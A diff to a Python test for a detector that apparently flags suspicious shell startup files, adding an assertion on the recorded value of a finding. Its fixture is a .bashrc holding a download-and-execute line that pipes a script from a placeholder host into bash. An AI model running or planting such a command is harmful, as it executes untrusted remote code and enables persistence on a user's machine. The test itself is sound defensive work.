@@ -380,6 +380,7 @@ def test_D2_old_rc_file_with_download_and_execute_is_flagged():
         "owner": "eve", "source": "/home/eve/.bashrc", "mtime": old, "ctime": old,
         "content": "curl -s http://x.example/i | bash\n"}]})
     assert len(findings) == 1 and findings[0].severity == Severity.MEDIUM
+    assert findings[0].raw_value == "curl -s http://x.example/i | bash"
 
 
 def test_D1_timestomped_rc_file_is_flagged():
